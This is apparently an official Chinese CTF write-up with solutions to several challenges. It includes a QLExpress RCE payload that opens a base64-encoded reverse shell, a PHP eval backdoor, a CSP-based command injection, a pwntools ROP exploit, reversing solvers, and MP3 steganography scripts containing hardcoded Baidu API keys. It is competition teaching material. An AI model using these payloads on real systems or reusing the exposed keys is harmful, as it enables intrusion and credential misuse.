# 官方WP（一）｜“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛

> 原文: https://www.ctfiot.com/76054.html
> ID: 76054

babyql

首先需要绕过hashCode,利用hashCode = s[0] * 31 + s[1]

传入"x":"guanzhujiarandundunjiechbO",即可绕过

观察到runner.execute(cmd, context, null, true, false);的第一个参数可控

网上并不能搜到利用QLExpressRCE的相关信息

查阅QLExpress官方文档

https://github.com/alibaba/QLExpress

可以看到可以通过第一个参数来执行表达式

但是其有默认的黑名单

又注意到题目中的黑名单

"process|runtime|javascript|\+|char|\\|from|\[|\]|load"

java.lang.Runtime.getRuntime().exec("bash -c {echo,ZWNobyxiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream()

%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29

{
"cmd":"import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName("nashorn").eval(java.net.URLDecoder.decode("%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"));",
"x":"guanzhujiarandundunjiechbO"
}

<?php
if($_SERVER['REMOTE_ADDR']!=='127.0.0.1'){
    die('only from local!');
}
else{
    $postdata = file_get_contents('php://input');
    $kv_list = explode('&',$postdata);
    if(count($kv_list)>0){
        foreach ($kv_list as $value){
            $kv = explode('=',$value);
            if(count($kv)==2){
                if($kv[0]==="bbzl's shell"){
                    eval($kv[1]);
                }
            }
        }
    }
}

Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26

{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"http://124.221.138.51/img/1.jpg","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":
200,"script-sample":""}}

0x00001251 <+4>:    push   ebp
0x00001252 <+5>:    mov    ebp,esp
0x00001254 <+7>:    sub    esp,0x10
0x00001257 <+10>:    mov    DWORD PTR [ebp-0x10],0x0
0x0000125e <+17>:    mov    DWORD PTR [ebp-0xc],0x0
0x00001265 <+24>:    mov    eax,DWORD PTR [ebp-0x10]
0x00001268 <+27>:    imul   edx,eax,0xc8
0x0000126e <+33>:    mov    eax,DWORD PTR [ebp+0x10]
0x00001271 <+36>:    add    edx,eax
0x00001273 <+38>:    mov    eax,DWORD PTR [ebp-0xc]
0x00001276 <+41>:    mov    eax,DWORD PTR [edx+eax*4]
0x00001279 <+44>:    mov    DWORD PTR [ebp-0x8],eax
0x0000127c <+47>:    mov    DWORD PTR [ebp-0x4],0x0
0x00001283 <+54>:    jmp    0x12dd <verify+144>
0x00001285 <+56>:    mov    edx,DWORD PTR [ebp-0x4]
0x00001288 <+59>:    mov    eax,DWORD PTR [ebp+0x8]
0x0000128b <+62>:    add    eax,edx
0x0000128d <+64>:    movzx  eax,BYTE PTR [eax]
0x00001290 <+67>:    cmp    al,0x52
0x00001292 <+69>:    jne    0x12a0 <verify+83>
0x00001294 <+71>:    cmp    DWORD PTR [ebp-0xc],0x30
0x00001298 <+75>:    jg     0x12a0 <verify+83>
0x0000129a <+77>:    add    DWORD PTR [ebp-0xc],0x1
0x0000129e <+81>:    jmp    0x12c2 <verify+117>
0x000012a0 <+83>:    mov    edx,DWORD PTR [ebp-0x4]
0x000012a3 <+86>:    mov    eax,DWORD PTR [ebp+0x8]
0x000012a6 <+89>:    add    eax,edx
0x000012a8 <+91>:    movzx  eax,BYTE PTR [eax]
0x000012ab <+94>:    cmp    al,0x44
0x000012ad <+96>:    jne    0x12bb <verify+110>
0x000012af <+98>:    cmp    DWORD PTR [ebp-0x10],0x30
0x000012b3 <+102>:    jg     0x12bb <verify+110>
0x000012b5 <+104>:    add    DWORD PTR [ebp-0x10],0x1
0x000012b9 <+108>:    jmp    0x12c2 <verify+117>
0x000012bb <+110>:    mov    eax,0x0
0x000012c0 <+115>:    jmp    0x12f1 <verify+164>
0x000012c2 <+117>:    mov    eax,DWORD PTR [ebp-0x10]
0x000012c5 <+120>:    imul   edx,eax,0xc8
0x000012cb <+126>:    mov    eax,DWORD PTR [ebp+0x10]
0x000012ce <+129>:    add    edx,eax
0x000012d0 <+131>:    mov    eax,DWORD PTR [ebp-0xc]
0x000012d3 <+134>:    mov    eax,DWORD PTR [edx+eax*4]
0x000012d6 <+137>:    add    DWORD PTR [ebp-0x8],eax
0x000012d9 <+140>:    add    DWORD PTR [ebp-0x4],0x1
0x000012dd <+144>:    mov    eax,DWORD PTR [ebp-0x4]
0x000012e0 <+147>:    cmp    eax,DWORD PTR [ebp+0xc]
0x000012e3 <+150>:    jl     0x1285 <verify+56>
0x000012e5 <+152>:    mov    eax,DWORD PTR [ebp-0x8]
0x000012e8 <+155>:    cmp    eax,DWORD PTR [ebp+0x14]
0x000012eb <+158>:    sete   al
0x000012ee <+161>:    movzx  eax,al
0x000012f1 <+164>:    leave  
0x000012f2 <+165>:    ret

int verify(const char* input, int size, int map[50][50], int max_val) {
    int x=0, y=0;
    int sum = map[x][y];
    for(int i = 0;i<size;++i) {
        if(input[i] == 'R' && y<49) {
            ++y;
        } else if (input[i]=='D' && x<49) {
            ++x;
        } else {
            return 0;
        }
        sum += map[x][y];
    }
    return sum == max_val;
}

def get_solution(arr):
    dp = [[0 for j in range(50)] for i in range(50)]
    dp[0][0] = arr[0][0]
    for i in range(1, 50):
        dp[0][i] = dp[0][i-1] + arr[0][i]
    for i in range(1, 50):
        dp[i][0] = dp[i-1][0] + arr[i][0]
    for i in range(1, 50):
        for j in range(1, 50):
            dp[i][j] = max(dp[i][j-1], dp[i-1][j]) + arr[i][j]

    max_val = 0
    max_idx = 0
    for i in range(50):
        if dp[49][i] > max_val:
            max_val = dp[49][i]
            max_idx = i

    if dp[49].count(max_val) > 1:
        #print("Multi solution!")
        return None

    sol = ""
    level = 49
    while level > 0:
        if max_idx > 0:
            if dp[level][max_idx-1] > dp[level-1][max_idx]:
                sol = "R" + sol
                max_idx = max_idx - 1
            elif dp[level][max_idx-1] < dp[level-1][max_idx]:
                sol = "D" + sol
                level = level - 1
            else:
                #print("Multi solution!")
                return None
        else:
            sol = "D" + sol
            level = level - 1

    for i in range(max_idx):
        sol = "R" + sol

    return sol, max_val, dp

arr = [
  [31,59,162,34,11,176,34,153,214,239,218,184,200,169,189,168,168,75,172,184,132,174,33,214,238,31,71,144,229,209,235,214,39,53,19,190,222,192,31,92,55,29,6,239,233,157,64,88,94,239],
  [11,117,166,47,72,16,6,70,190,177,110,123,56,36,209,44,152,130,13,162,35,11,112,187,92,226,123,192,209,201,132,150,100,188,253,120,210,247,172,25,63,74,86,208,60,38,9,151,108,99],
  [45,117,151,132,252,117,105,170,183,87,123,43,45,207,162,13,146,114,76,220,209,31,178,84,210,196,221,62,36,12,1,155,86,150,220,204,145,228,119,38,240,107,137,105,227,18,185,78,36,24],
  [240,122,104,46,183,177,96,65,65,222,69,211,192,222,233,7,36,34,55,139,154,135,95,36,124,94,133,61,208,140,223,194,176,156,243,68,51,83,138,235,30,249,172,151,121,171,172,205,147,53],
  [90,14,62,152,181,58,208,251,210,178,70,37,235,45,88,78,219,183,103,35,19,173,232,160,13,36,250,252,214,33,176,190,115,113,216,210,160,150,100,237,4,37,10,110,139,6,68,252,53,22],
  [154,7,3,33,93,55,42,111,112,137,228,172,208,111,68,110,48,20,238,226,110,54,42,164,64,211,226,228,29,3,50,206,141,220,244,59,155,19,195,129,105,188,181,151,232,204,209,149,211,22],
  [155,113,94,226,183,51,57,202,68,84,222,44,32,71,172,100,22,15,153,91,97,183,62,48,149,51,235,122,208,161,24,142,1,215,223,234,162,158,228,193,146,182,85,175,133,138,15,225,24,182],
  [182,177,51,87,231,126,112,84,173,206,223,2,137,76,216,125,132,229,59,52,134,65,195,112,122,190,250,23,240,70,182,39,171,255,67,143,84,53,254,238,238,25,143,17,249,211,72,121,109,57],
  [245,140,112,220,67,65,112,52,46,186,252,130,249,236,194,92,196,53,211,179,91,119,83,6,184,205,248,233,159,130,204,130,143,171,227,30,167,23,146,134,166,11,128,64,251,119,160,23,59,24],
  [162,54,17,217,11,127,203,183,251,171,237,202,188,202,52,39,109,175,127,193,11,248,10,99,212,8,183,147,134,228,111,148,13,50,186,67,85,16,242,216,192,128,129,28,82,15,173,129,92,224],
  [119,69,43,81,75,180,69,109,11,250,14,241,124,193,137,144,53,175,165,39,211,135,247,173,243,253,44,213,92,192,145,138,217,104,18,82,252,101,135,90,55,115,248,235,256,139,78,42,239,17],
  [132,221,29,180,170,62,26,140,34,199,161,66,66,28,250,53,237,42,223,5,42,15,31,109,68,141,35,239,142,5,80,12,75,123,12,181,139,131,167,173,72,107,150,252,242,106,240,12,79,147],
  [194,65,155,224,195,186,208,73,221,132,120,73,110,28,91,204,111,199,127,164,166,204,250,11,209,209,81,237,146,125,233,177,79,140,175,44,13,56,179,82,80,227,167,105,170,13,248,251,72,152],
  [222,223,7,195,246,248,255,115,188,106,85,117,244,35,191,43,135,254,172,234,101,70,105,96,30,248,37,39,168,256,156,24,130,96,169,99,93,136,223,151,76,71,101,239,178,188,11,191,82,2],
  [41,15,2,40,221,165,207,22,81,239,150,139,161,78,246,87,120,70,121,125,244,238,176,56,35,173,24,196,47,66,197,228,153,55,204,151,251,81,87,184,43,247,226,155,62,219,65,38,48,241],
  [226,163,167,252,187,253,65,138,251,229,236,203,79,71,213,55,36,232,29,173,156,41,174,131,90,31,129,14,66,247,153,122,228,192,14,180,118,223,213,255,53,143,205,1,166,189,155,19,13,116],
  [111,115,183,159,38,251,99,65,84,84,97,247,217,188,2,80,141,149,173,115,131,141,72,107,106,203,162,90,20,47,156,99,99,56,121,190,240,201,87,156,0,96,196,12,122,175,24,195,73,184],
  [116,17,63,197,252,226,159,220,105,247,138,234,171,86,187,108,11,104,123,207,255,122,24,62,249,217,50,231,54,64,134,5,140,239,171,125,128,115,178,120,107,46,64,125,78,112,128,241,24,27],
  [74,163,34,13,2,168,126,60,219,19,31,82,44,175,124,8,223,32,12,208,119,36,206,110,61,210,157,202,228,96,199,115,77,109,160,78,194,124,73,254,141,1,97,249,12,27,153,193,51,207],
  [78,182,92,255,94,256,244,173,51,197,28,34,178,143,173,197,94,132,194,244,24,240,3,162,66,68,182,102,20,71,131,142,105,122,121,157,61,185,203,227,110,110,117,5,225,73,57,129,132,25],
  [100,113,138,85,153,115,154,167,132,80,36,23,111,86,221,42,196,98,113,89,175,19,145,140,150,51,6,21,184,213,162,101,252,115,36,165,186,145,176,8,102,1,206,30,119,56,130,185,61,226],
  [109,237,182,134,35,117,127,49,111,90,141,83,239,141,60,105,214,107,62,25,250,133,254,105,97,141,187,230,110,180,178,192,206,49,242,71,138,168,105,57,63,247,47,148,80,5,117,123,147,188],
  [136,10,134,193,227,229,232,185,119,238,123,0,172,27,17,73,1,86,43,41,188,16,90,146,229,230,3,215,25,193,143,232,17,193,195,256,242,38,182,73,25,140,17,178,89,78,247,1,133,22],
  [65,220,147,60,28,101,152,106,218,245,127,254,37,118,224,192,46,123,16,203,23,138,57,50,256,227,198,180,177,25,141,87,111,234,103,10,148,73,91,15,36,105,79,129,90,79,170,217,87,181],
  [12,76,85,27,62,115,116,221,166,243,97,135,142,223,192,220,33,86,30,135,142,143,78,249,137,56,218,34,186,111,121,31,184,230,12,195,189,31,20,148,59,233,179,20,141,179,147,60,194,175],
  [247,108,209,92,201,117,164,253,211,194,114,62,59,103,123,228,39,100,62,243,164,169,224,35,59,94,6,10,187,116,44,152,55,117,37,227,49,145,133,235,31,18,215,2,168,42,154,68,184,10],
  [93,0,200,198,247,163,123,117,98,44,158,61,114,11,56,3,128,39,105,0,176,29,100,2,119,115,145,135,138,28,4,119,166,183,45,249,196,192,90,161,126,214,161,42,202,150,70,245,62,123],
  [12,59,139,135,117,158,90,0,121,255,105,58,26,247,213,105,205,125,232,54,238,210,9,101,85,96,94,151,118,48,125,119,77,236,66,75,241,108,90,85,137,88,19,166,245,108,33,208,154,88],
  [230,149,85,121,249,128,165,106,85,137,161,25,247,253,95,254,132,123,17,10,230,72,206,174,168,228,250,164,79,12,77,195,219,209,211,208,57,247,165,254,250,203,48,199,6,49,112,31,172,78],
  [21,97,244,163,61,138,24,93,235,187,107,49,231,129,166,168,105,213,188,120,81,136,70,129,78,246,118,160,230,66,83,99,250,176,99,21,109,172,99,235,86,180,145,99,49,31,99,126,198,47],
  [72,75,7,120,42,113,216,241,46,207,34,176,37,117,84,20,86,214,136,125,61,44,216,61,177,66,182,134,108,64,94,91,4,12,244,131,20,254,121,237,26,199,57,217,43,40,57,1,124,234],
  [125,96,128,252,63,0,161,130,104,115,21,70,223,4,212,68,45,233,143,124,40,238,249,3,206,176,102,188,208,120,186,252,16,155,94,235,67,25,226,119,136,244,25,156,240,244,193,17,218,169],
  [148,20,159,113,52,168,229,213,172,200,70,244,69,168,195,96,168,152,200,47,123,139,120,116,192,14,134,145,163,199,196,120,174,70,21,234,22,88,102,127,55,22,245,19,16,187,114,119,252,112],
  [54,237,256,58,55,182,70,66,214,177,126,106,80,65,218,235,191,94,213,252,57,165,13,190,224,52,11,36,208,141,119,194,231,253,16,169,239,37,25,251,1,241,247,133,12,34,244,86,67,43],
  [29,40,108,109,205,7,88,206,29,221,123,141,251,76,64,68,204,228,57,195,15,188,6,113,46,174,116,40,71,125,180,240,10,23,18,226,240,208,180,57,53,205,205,101,64,97,63,251,77,106],
  [176,146,160,144,239,64,63,255,105,121,75,204,194,66,168,166,253,54,84,33,185,175,146,86,54,87,127,141,14,170,248,81,26,21,25,194,9,24,241,213,185,43,144,133,112,142,7,55,17,49],
  [156,27,118,8,111,22,164,28,80,16,69,23,14,14,181,141,48,15,161,46,92,79,198,212,121,42,41,0,206,186,81,42,166,158,33,104,153,7,181,88,164,105,29,247,10,211,98,103,224,186],
  [38,122,27,198,206,166,139,212,204,199,125,209,190,166,162,1,109,126,251,106,181,176,31,93,89,70,103,193,153,102,154,253,116,72,61,214,46,63,154,142,127,34,80,166,230,12,75,139,204,25],
  [79,27,105,30,175,107,158,21,179,84,48,202,38,87,148,250,145,49,147,112,82,93,234,8,144,161,201,55,9,250,249,19,245,51,211,143,226,214,30,66,199,18,98,243,142,96,119,254,13,145],
  [73,17,241,93,126,64,243,182,131,74,8,8,130,241,256,58,121,207,106,112,172,63,244,166,135,81,104,157,117,116,19,138,123,33,164,202,238,216,23,230,29,117,186,237,193,213,70,200,137,204],
  [175,43,178,24,125,9,90,208,133,2,31,135,207,158,76,114,255,159,14,207,218,208,255,16,244,121,135,11,94,132,175,222,6,101,171,27,134,2,181,175,222,63,243,204,98,30,44,35,69,175],
  [244,190,74,183,118,189,148,86,238,194,232,33,219,21,103,191,175,150,228,1,205,34,51,189,222,127,61,144,78,160,155,117,74,222,192,189,116,101,243,50,6,212,60,76,90,87,93,135,215,235],
  [56,110,105,28,52,42,145,7,196,110,229,237,219,243,141,73,30,73,123,108,149,144,236,202,108,10,72,160,16,111,173,22,235,86,86,174,185,44,78,144,200,118,33,158,190,3,255,10,148,83],
  [249,147,83,224,170,122,14,241,126,36,248,46,246,25,228,143,26,146,210,47,0,28,122,206,213,179,69,163,189,187,149,128,171,168,200,110,187,256,238,125,250,118,15,106,14,38,119,179,1,209],
  [68,79,154,139,71,117,130,98,136,160,146,74,137,107,115,108,233,242,199,206,19,223,147,44,100,33,77,70,66,173,131,85,68,63,92,87,79,239,96,176,164,203,50,53,256,89,77,88,126,7],
  [130,11,151,11,201,119,165,163,189,120,22,170,46,138,136,118,153,250,70,164,208,230,150,156,53,28,243,46,166,54,143,192,225,225,253,5,212,138,235,179,95,255,195,68,248,105,192,237,121,14],
  [236,204,77,120,79,191,176,77,38,221,97,170,41,9,96,195,70,18,96,28,13,51,87,225,2,28,218,230,53,253,171,83,83,224,41,31,247,126,228,254,115,0,87,33,29,85,200,113,158,187],
  [22,186,66,8,171,180,195,151,204,157,211,141,217,67,80,20,58,21,233,115,62,111,166,210,65,95,252,139,80,223,31,6,226,204,92,197,122,133,51,64,191,250,203,118,144,135,247,97,35,10],
  [45,144,167,46,138,170,169,113,202,58,93,86,29,118,43,121,228,93,120,71,113,99,185,102,64,5,247,123,224,214,148,132,166,49,238,199,211,197,243,48,55,103,74,73,218,62,200,47,73,135],
  [27,128,70,245,100,225,76,201,20,130,112,132,45,92,143,12,12,159,238,142,184,181,152,227,113,67,53,232,203,192,177,94,88,211,11,231,41,232,0,48,161,9,107,80,138,190,230,166,250,102],
]

if __name__ == "__main__":
    sol, max_val, dp = get_solution(arr)
    print(sol)

RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR

RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
Good job
flag{333b61656d554e1e200208247b73}

import idc

st = MinEA()
ed = MaxEA()
ea = st
while ea < ed:
    if Byte(ea) == 0x75 and Byte(ea+1) == 0x03 and Byte(ea+2) == 0x74 and Byte(ea+3) == 0x01 and Byte(ea+4) == 0xe8:
        print("发现花指令")    
        patch_byte(ea, 0x90)
        patch_byte(ea+1, 0x90)
        patch_byte(ea+2, 0x90)
        patch_byte(ea+3, 0x90)
        patch_byte(ea+4, 0x90)
    ea += 1

#include <string.h>
#include <stdio.h>

#define BYTE unsigned char
#define WORD unsigned short
#define DWORD unsigned int

#define TRUE 1
#define FALSE 0

BYTE bThreshold;  //压缩阈值、长度大于等于2的匹配串才有必要压缩

BYTE bPreBufSizeBits;  //前向缓冲区占用的比特位
BYTE bWindowBufSizeBits;  //滑动窗口占用的比特位

WORD wPreBufSize;  //通过占用的比特位计算缓冲区大小
WORD wWindowBufSize;  //通过占用的比特位计算滑动窗口大小

BYTE bPreBuf[1024];  //前向缓冲区
BYTE bWindowBuf[8192];  //滑动窗口
BYTE bMatchString[1024];  //匹配串
WORD wMatchIndex;  //滑动窗口匹配串起始下标

BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex);
DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName);

int main()
{
    bThreshold = 3;
    bPreBufSizeBits = 8;
    bWindowBufSizeBits = 16 - bPreBufSizeBits;
    wPreBufSize = ((WORD)1 << bPreBufSizeBits) - 1 + bThreshold;
    wWindowBufSize = ((WORD)1 << bWindowBufSizeBits) - 1 + bThreshold;

    LZSS_decode("out", "decode.txt");
    return 0;
}

BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex)
{
    WORD i, j;

    for (i = 0; i < wLenA; i++)
    {
        if ((wLenA - i) < wLenB)
        {
            return FALSE;
        }

        if (pbStrA[i] == pbStrB[0])
        {
            for (j = 1; j < wLenB; j++)
            {
                if (pbStrA[i + j] != pbStrB[j])
                {
                    break;
                }
            }

            if (j == wLenB)
            {
                *pwMatchIndex = i;
                return TRUE;
            }
        }
    }
    return FALSE;
}

DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName)
{
    WORD i, j;
    BYTE bItemNum;
    BYTE bFlag;
    WORD wStart;
    WORD wMatchStringCnt = 0;
    WORD wWindowBufCnt = 0;
    FILE *pfRead = fopen(pbReadFileName, "rb");
    FILE *pfWrite = fopen(pbWriteFileName, "wb");

    while (0 != fread(&bFlag, 1, 1, pfRead))
    {
        for (bItemNum = 0; bItemNum < 8; bItemNum++)
        {
            if (0 == (bFlag & ((BYTE)1 << (7 - bItemNum))))
            {
                if (fread(bPreBuf, 1, 1, pfRead) < 1)
                {
                    goto LZSS_decode_out_;
                }
                fwrite(bPreBuf, 1, 1, pfWrite);
                bMatchString[0] = bPreBuf[0];
                wMatchStringCnt = 1;
            }
            else
            {
                if (fread(bPreBuf, 1, 2, pfRead) < 2)
                {
                    goto LZSS_decode_out_;
                }
                wStart = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] << 8)) / ((WORD)1 << bPreBufSizeBits);  
                wMatchStringCnt = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] << 8)) % ((WORD)1 << bPreBufSizeBits) + bThreshold;
                fwrite(&bWindowBuf[wStart], 1, wMatchStringCnt, pfWrite);
                memcpy(bMatchString, &bWindowBuf[wStart], wMatchStringCnt);
            }
            if ((wWindowBufCnt + wMatchStringCnt) > wWindowBufSize)
            {
                j = (wWindowBufCnt + wMatchStringCnt) - wWindowBufSize;
                for (i = 0; i < wWindowBufCnt - j; i++)
                {
                    bWindowBuf[i] = bWindowBuf[i + j];
                }
                wWindowBufCnt -= j;
            }
            memcpy(&bWindowBuf[wWindowBufCnt], bMatchString, wMatchStringCnt);
            wWindowBufCnt += wMatchStringCnt;
        }
    }

LZSS_decode_out_:

    fclose(pfRead);
    fclose(pfWrite);
    return 0;
}

from pwn import*
context.log_level=True
#p=process('./stack')
p=remote("127.0.0.1",8665)
elf=ELF('stack')
libc=ELF('libc.so.6')
buf=0x6010A0+0X100
print hex(buf)
#puts_plt=elf.plt['puts']
puts_plt=0x400520
puts_got=elf.got['puts']
#read_plt=elf.plt['read']
read_plt=0x400530
main=0x40071A

leve_ret=0x00400718
popret=0x00000000004007a3

payload='A'*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)

p.recvuntil('your name:n')
p.send(payload)

p.recvuntil('your data:n')
payload1='a'*0x70+p64(buf)+p64(leve_ret)

#gdb.attach(p,'b *0x40060F')
#raw_input()

p.send(payload1)

#p.recv()

putsadd=u64(p.recvuntil('n',drop=True).ljust(0x8,'x00'))
print hex(putsadd)

libc_base = putsadd- libc.sym['puts']
one_gadget = libc_base +0xf03a4
p.recv()
p.send("1")
p.recv()
pay= 0x78*'a' + p64(one_gadget)*4
p.send(pay)
p.interactive()

size_r=src.size;
ptr_r=src.ptr;
check(src,dst);
free(dst.ptr);
src.size=0;src.ptr=0;
dst.size=size_r;dst.ptr=src_r;
//src=dst时，会导致dst的ptr指向已释放的区域，且dst.size=0

struct Table {
    struct GCObject *next;
    lu_byte tt;
    lu_byte marked;
    lu_byte flags;
    lu_byte lsizenode;
    unsigned int alimit;
    TValue *array;
    Node *node; /*     24      |       8 */
    Node *lastfree;
    struct Table *metatable;
    GCObject *gclist;
}

from PIL import Image
import os
from aip import AipSpeech
from subprocess import *
from tqdm import tqdm  
import pickle 
import io 

def load_mp3(folder):
    '''
    加载文件夹下的mp3
    '''
    mp3list = []
    # img=[]
    for mp3 in os.listdir(folder):
        ext = os.path.splitext(mp3)
        # if len(ext) > 1 and is_img(ext[1]):
        if ext[1] == '.mp3' :
            filename=folder+mp3
            mp3list.append(filename)
            # img.append(mp3)

    return mp3list

def getimage(mp3file):
    with open(mp3file,'rb') as f:
        fr=f.read()
    offset=int.from_bytes(fr[14:18],'big')
    fr1=fr[20:20+offset]
    fr1=fr1[13:]
    img=io.BytesIO(fr1)
    img=Image.open(img)
    return img
    pass

def main():

    num_dict={"0":u"零","1":u"一","2":u"二","3":u"三","4":u"四","5":u"五","6":u"六","7":u"七","8":u"八","9":u"九"}
    new_dict={v:k for k,v in num_dict.items()}
    print(num_dict)
    print(new_dict)  #互换键值
    set1=set('0123456789'+''.join([i for i in new_dict]))
    set2=set('0123456789')

    mp3list=load_mp3('./random/')

    dict1={}
    for i,mp3 in tqdm(enumerate(mp3list)):    #把mp3转换成wav，百度aip对wav支持较好
        wavname='./wav/'+os.path.split(mp3)[1].split('.')[0]+'.wav'
        indexname=os.path.split(mp3)[1].split('.')[0]
        cmd="ffmpeg.exe -i {} -f wav -ac 1 -ar 16000 {}".format(mp3,wavname)   #调用ffmpeg.exe

        p=Popen(cmd,shell=True,stdout=open("process.out", "w"), close_fds=True)
        p.wait()

        with open(wavname, 'rb') as f:
            fp= f.read()
            # 识别本地文件
        try:
            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})
# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
            tmp=result['result'][0][:-1]
            if set(tmp).issubset(set2):
                dict1[indexname]=int(tmp)
            elif    set(tmp).issubset(set1):
                tmp1=''
                for j in tmp:
                    if j in set2:
                        tmp1+=j
                    else:
                        tmp1+=new_dict[j]
                dict1[indexname]=int(tmp1)
            else:
                dict1[indexname]=tmp
        
except Exception as e:
            print(e)
            print("./wav/{}.wav".format(i))
    pass
    dict2={v:k for k,v in dict1.items()}   #互换键值
    print(dict2)
    for i in range(0,625):
        try:
            dict2[i]
        
except Exception as e:
            print(e)
            print(i,'不存在')
    pick_file = open('dict2.pickle','wb')
    pickle.dump(dict2,pick_file)
    pick_file.close()

    pick_file = open('dict1.pickle','wb')
    pickle.dump(dict1,pick_file)
    pick_file.close()

APP_ID = '26805318' 
API_KEY = 'zXkQ4cEEVHPHLSoEjqLgevqQ' 
SECRET_KEY = '7GptONVCNLblYqwevUq6YzgFLPOO1i4B' 

client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)

wavpath='./wav/'     #调试数据所在目录
if not os.path.exists(wavpath):
    os.mkdir(wavpath)

if  not os.path.exists('dict2.pickle'):
    main()      #如果没有转换成wav,需要先转换一次,然后得到pickle
else:            #直接读取pickle
    pickfile = open('dict2.pickle','rb')
    dictfile2 = pickle.load(pickfile)
    print(dictfile2)
    pickfile = open('dict1.pickle','rb')
    dictfile1 = pickle.load(pickfile)
    print(dictfile1)
    pass

img1=Image.new('RGB',(2500,2500),'white')  #新建底图
for i in range(0,625):
    try:
        mp3num=dictfile2[i]
        mp3file='./random/'+mp3num+'.mp3'
        img=getimage(mp3file)    #提取mp3中的图片
        x=(i%25)*100
        y=(i//25)*100
        img1.paste(img,(x,y))
    
except Exception as e:
        print(e)
        print(i,'没有找到')
img1.save('tmp.png')
img1.show()
pass

import pickle
import os 

def load_mp3(folder):
    '''
    加载文件夹下的mp3
    '''
    mp3list = []
    # img=[]
    for mp3 in os.listdir(folder):
        ext = os.path.splitext(mp3)
        # if len(ext) > 1 and is_img(ext[1]):
        if ext[1] == '.mp3' :
            filename=folder+mp3
            mp3list.append(filename)
            # img.append(mp3)

    return mp3list

def getFrameoffset(fr):
    tmp=''
    for i in fr:
        tmp+=bin(i)[2:].zfill(7)
    pass
    return int(tmp,2)

def getpadding(mp3):
    with open(mp3,'rb')as f:
        fr=f.read()
    offset=getFrameoffset(fr[6:10])+10
    padding=fr[offset-4096:
offset]
    if set(padding)=={0}:    #全为0说明padding里头没有数据
        print('no mp3 inside')
        return None,fr
    else:                    #说明padding里头有东西,我们从非0开始取数据,发现是mp3
        for i,data in enumerate(padding):
            if data!=0:
                newmp3=padding[i:]
                return newmp3,fr
    pass

pickfile = open('dict2.pickle','rb')
dictfile2 = pickle.load(pickfile)
print(type(dictfile2),dictfile2)
print(100*'*')
pickfile = open('dict1.pickle','rb')
dictfile1 = pickle.load(pickfile)
print(type(dictfile1),dictfile1)

if not os.path.exists('./存在padding的文件/'):
    os.mkdir('./存在padding的文件/')

mp3list=load_mp3('./random/')
for i,mp3 in enumerate(mp3list):
    n=os.path.split(mp3)[1].split('.')[0]
    newmp3,mp3file=getpadding(mp3)
    if newmp3:   #padding中存在mp3
        open('./存在padding的文件/{}-{}-padding.mp3'.format(dictfile1[n],n),'wb').write(newmp3)
        open('./存在padding的文件/{}-{}.mp3'.format(dictfile1[n],n),'wb').write(mp3file)
    else:
        continue
    pass

import os
from aip import AipSpeech
from subprocess import *

def load_mp3(folder):
    '''
    加载文件夹下的mp3
    '''
    mp3list = []
    dict1={}
    for mp3 in os.listdir(folder):
        ext = os.path.splitext(mp3)

        if ext[1] == '.mp3' and 'padding' in mp3:
            id=int(ext[0].split('-')[0])
            filename=folder+mp3
            mp3list.append(filename)
            dict1[id]=filename

    return mp3list,dict1

APP_ID = '26805318' 
API_KEY = 'zXkQ4cEEVHPHLSoEjqLgevqQ' 
SECRET_KEY = '7GptONVCNLblYqwevUq6YzgFLPOO1i4B' 

